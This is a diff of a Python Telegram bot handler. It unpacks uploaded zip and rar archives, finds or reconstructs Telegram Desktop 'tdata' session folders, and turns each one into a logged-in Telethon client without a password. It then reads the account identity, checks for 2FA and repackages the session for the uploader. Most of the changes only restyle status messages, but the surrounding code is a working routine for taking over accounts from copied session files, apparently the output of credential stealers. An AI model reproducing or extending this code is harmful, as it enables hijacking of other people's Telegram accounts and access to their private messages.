@@ -332,35 +332,35 @@ async def handle_archive(client, message):
     tempdir = tempfile.mkdtemp()
     results = []
     try:
-        sy = await message.reply("• Sᴛᴇᴘ 1: Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...")
+        sy = await message.reply("• Sᴛᴇᴘ 1: Dᴏᴡɴʟᴏᴀᴅɪɴɢ ꜰɪʟᴇ...", quote=True)
         try:
             file_path = await message.download(file_name=os.path.join(tempdir, message.document.file_name))
             await sy.edit(f"• Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ `{file_path}`")
         except Exception as e:
-            return await sy.edit(f"❌ Sᴛᴇᴘ 1 (Dᴏᴡɴʟᴏᴀᴅ) ꜰᴀɪʟᴇᴅ: {e}")
+            return await sy.edit(f"• Sᴛᴇᴘ 1 (Dᴏᴡɴʟᴏᴀᴅ) ꜰᴀɪʟᴇᴅ: {e}")
 
         extract_dir = os.path.join(tempdir, "extracted")
         os.makedirs(extract_dir, exist_ok=True)
-        await sy.edit(f"✅ Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
+        await sy.edit(f"• Sᴛᴇᴘ 1.2: Fɪʟᴇ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴛᴏ {file_path}")
         await show_zip_structure(file_path, message, client)
 
-        await sy.edit("📦 Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
+        await sy.edit("• Sᴛᴇᴘ 2.1: Tʀʏɪɴɢ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ᴀʀᴄʜɪᴠᴇ...")
         try:
             with zipfile.ZipFile(file_path, "r") as zip_ref:
                 zip_ref.extractall(extract_dir)
-            await sy.edit(f"✅ Sᴛᴇᴘ 2.2: Zɪᴘ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
+            await sy.edit(f"• Sᴛᴇᴘ 2.2: Zɪᴘ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
         except Exception as e_zip:
             try:
                 with rarfile.RarFile(file_path, "r") as rar_ref:
                     rar_ref.extractall(extract_dir)
-                await sy.edit(f"✅ Sᴛᴇᴘ 2.3: Rᴀʀ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
+                await sy.edit(f"• Sᴛᴇᴘ 2.3: Rᴀʀ ᴇxᴛʀᴀᴄᴛᴇᴅ ᴛᴏ `{extract_dir}`")
             except Exception as e_rar:
                 return await message.reply(
-                    f"❌ Sᴛᴇᴘ 2 (Exᴛʀᴀᴄᴛɪᴏɴ) ꜰᴀɪʟᴇᴅ.\n"
+                    f"• Sᴛᴇᴘ 2 (Exᴛʀᴀᴄᴛɪᴏɴ) ꜰᴀɪʟᴇᴅ.\n"
                     f"Zɪᴘ ᴇʀʀᴏʀ: {e_zip}\nRᴀʀ ᴇʀʀᴏʀ: {e_rar}"
                 )
 
-        await sy.edit("🔍 Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")
+        await sy.edit("• Sᴛᴇᴘ 3: Sᴇᴀʀᴄʜɪɴɢ / ʙᴜɪʟᴅɪɴɢ `ᴛᴅᴀᴛᴀ`...")
 
         tdata_paths = []
 
@@ -371,7 +371,7 @@ async def handle_archive(client, message):
 
             if has_d877 and has_keys:
                 tdata_paths.append(root)
-                await sy.edit(f"🔎 Fᴏᴜɴᴅ ᴠᴀʟɪᴅ ᴛᴅᴀᴛᴀ ꜰᴏʟᴅᴇʀ: {root}")
+                await sy.edit(f"• Fᴏᴜɴᴅ ᴠᴀʟɪᴅ ᴛᴅᴀᴛᴀ ꜰᴏʟᴅᴇʀ: {root}")
 
             elif has_d877:
                 fake_tdata = os.path.join(root, "tdata")
@@ -381,12 +381,12 @@ async def handle_archive(client, message):
                         shutil.move(os.path.join(root, item),
                                     os.path.join(fake_tdata, item))
                 tdata_paths.append(fake_tdata)
-                await sy.edit(f"🔧 Bᴜɪʟᴛ ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")
+                await sy.edit(f"• Bᴜɪʟᴛ ꜰᴀᴋᴇ ᴛᴅᴀᴛᴀ ᴀᴛ: {fake_tdata}")
 
             for f in files:
                 if f.lower().endswith(".rar"):
                     rar_path = os.path.join(root, f)
-                    await sy.edit(f"📂 Fᴏᴜɴᴅ ɪɴɴᴇʀ Rᴀʀ: {rar_path}")
+                    await sy.edit(f"• Fᴏᴜɴᴅ ɪɴɴᴇʀ Rᴀʀ: {rar_path}")
                     try:
                         rar_extract_dir = os.path.join(root, "rar_extracted")
                         os.makedirs(rar_extract_dir, exist_ok=True)
@@ -397,7 +397,7 @@ async def handle_archive(client, message):
                             has_keys_rar = any(x in ("key_data", "key_1") for x in f2 + d2)
                             if has_d877_rar and has_keys_rar:
                                 tdata_paths.append(r2)
-                                await message.reply(f"🔎 Exᴛʀᴀᴄᴛᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴛᴅᴀᴛᴀ: {r2}")
+                                await message.reply(f"• Exᴛʀᴀᴄᴛᴇᴅ ɪɴɴᴇʀ Rᴀʀ ᴛᴅᴀᴛᴀ: {r2}")
                     except Exception as e:
                         await message.reply(f"⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ᴇxᴛʀᴀᴄᴛ ɪɴɴᴇʀ Rᴀʀ: {e}")
                         fake_tdata = os.path.join(root, "tdata")
@@ -419,19 +419,18 @@ async def handle_archive(client, message):
                 if not tdesk.isLoaded():
                     results.append(f"#{offset} ⚠️ Fᴀɪʟᴇᴅ ᴛᴏ ʟᴏᴀᴅ (ᴄᴏʀʀᴜᴘᴛᴇᴅ ᴛᴅᴀᴛᴀ)")
                     continue
-                await sy.edit(f"✅ Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{offset}")
+                await sy.edit(f"• Lᴏᴀᴅᴇᴅ ᴛᴅᴀᴛᴀ #{offset}")
 
                 tele_client = await tdesk.ToTelethon(session=None, flag=UseCurrentSession)
                 await tele_client.connect()
-                await sy.edit(f"📡 Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{offset}")
+                await sy.edit(f"• Cᴏɴɴᴇᴄᴛᴇᴅ Tᴇʟᴇᴛʜᴏɴ ᴄʟɪᴇɴᴛ ꜰᴏʀ ᴛᴅᴀᴛᴀ #{offset}")
 
                 if not await tele_client.is_user_authorized():
                     results.append(f"#{offset} ⚠️ Nᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ (ɴᴇᴇᴅs ʟᴏɢɪɴ / 2FA)")
                     await message.reply(f"⚠️ ᴛᴅᴀᴛᴀ #{offset} ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ")
-                    #continue
-                await message.reply(f".ᴢᴇᴅ")
+                    continue
                 me = await tele_client.get_me()
-                await message.reply(f"👤 Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id})")
+                await sy.edit(f"• Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id})")
                 syd = await check_2fa(tele_client)
                 clean_zip_path = os.path.join(tempfile.gettempdir(), f"{me.id}_tdata.zip")
                 with zipfile.ZipFile(clean_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
@@ -463,7 +462,7 @@ async def handle_archive(client, message):
                 )
 
                 await tele_client.disconnect()
-                await sy.edit(f"✅ Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{sydno}")
+                await sy.edit(f"Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{sydno} ✅")
                 if message.from_user.id not in ADMINS:
                     await db.syd.update_one(
                     {"user_id": message.from_user.id},
@@ -485,10 +484,10 @@ async def handle_archive(client, message):
         with open(report_path, "w") as f:
             f.write(report_text)
 
-        await message.reply_document(report_path, caption="✅ Rᴇᴘᴏʀᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ")
+        await message.reply_document(report_path, caption="Rᴇᴘᴏʀᴛ ɢᴇɴᴇʀᴀᴛᴇᴅ ✅")
 
     except Exception as e:
-        await message.reply(f"❌ Tᴏᴘ-ʟᴇᴠᴇʟ ᴇʀʀᴏʀ: {e}")
+        await message.reply(f"❌ ᴇʀʀᴏʀ: {e}")
     finally:
         shutil.rmtree(tempdir, ignore_errors=True)
 
